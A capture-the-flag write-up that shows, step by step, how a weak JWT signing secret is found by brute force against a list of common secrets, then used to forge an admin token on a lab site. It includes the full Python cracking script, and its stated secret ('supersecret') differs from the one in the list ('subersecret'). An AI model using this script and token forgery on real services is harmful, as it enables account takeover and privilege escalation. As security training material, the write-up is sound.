# Web | Just What you Think

### Coin: 100

**Link**: [https://ctf-1-vo9x.vercel.app/](https://ctf-1-vo9x.vercel.app/)

first step, i created an account from the register functionality

when i check the admin functionality i got : `You are not admin.` 

so my account privigile or role is `user` 

i knew this after analysing the jwt token on [jwt.io](http://jwt.io) 

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image.png)

so now we need to analyise the jwt setup or configration 

first i checked for the sercret key for the jwt signature to test its strongsts

i used this python [code](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881.md) with the most and basic defualt secrets, 

and i found the secret key: it is `supersecret`

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%201.png)

then i verified it on jwt.io:

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%202.png)

then in JWT Encoder i changed the role to admin using the secret key:

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%203.png)

then i set the new token 

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%204.png)

and it works i could change my role from user to admin and use the admin funtionality and got the flag

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%205.png)

- python code with the top 100  default secrets including the one in the challenge `subersecret`
    
    ```jsx
    import jwt
    
    """
    JWT secret key bruteforce
    """
    
    # JWT Token to decode
    token = input('Enter the Token: ')
    
    # List of common secrets to try
    secrets = [
        "secret", "password", "admin", "123456", "letmein", 
        "changeme", "qwerty", "abcdef", "test", "jwtsecret",
        "admin123", "mysecret", "welcome", "123123", "1q2w3e4r", 
        "123qwe", "root", "toor", "letmein123", "password123", 
        "password1", "iloveyou", "monkey", "sunshine", "football", 
        "1234", "princess", "qwerty123", "12345", "123abc", 
        "hello", "welcome123", "123qaz", "adminadmin", "trustno1", 
        "trustnoone", "shadow", "master", "guest", "god", "test123",
        "hunter2", "admin1234", "changeme123", "p@ssw0rd", 
        "letmein1234", "welcome1", "passw0rd", "root123", "p@ssword", 
        "qwertyuiop", "monkey123", "iloveyou123", "12345qwerty", "abc123", 
        "qwertyui", "password321", "secret123", "abcd1234", "1234qwerty", 
        "1qaz2wsx", "qazwsx", "1qazXSW@", "myadmin", "letmeinqwerty", 
        "hello123", "admin12345", "12345admin", "welcome12345", "qwerty12",
        "letmeinqwerty123", "y0u45ecreT", "s3cret", "p4ssword", "secretkey", 
        "forbidden", "getoverit", "password111", "1234root", "god123", 
        "access123", "passphrase", "mysupersecret", "iloveyou1", "secure123", 
        "abcde12345", "password!123", "12345letmein", "12345secret", "asdfgh", 
        "pass123", "fakepassword", "thisispassword", "ilovepassword", "1234test",
        "secretpassword", "user123", "123456789", "welcome12345", "subersecret"
    ]
    
    # Try each secret
    for secret in secrets:
        try:
            # Attempt to decode the token with the current secret
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            print(f"[+] Success! \n[+] Secret: {secret} -> Payload: {decoded}")
            break  # Exit once the valid secret is found
        except jwt.ExpiredSignatureError:
            print(f"Expired signature, secret: {secret}")
        except jwt.InvalidTokenError:
            pass  # Ignore invalid token errors
    ```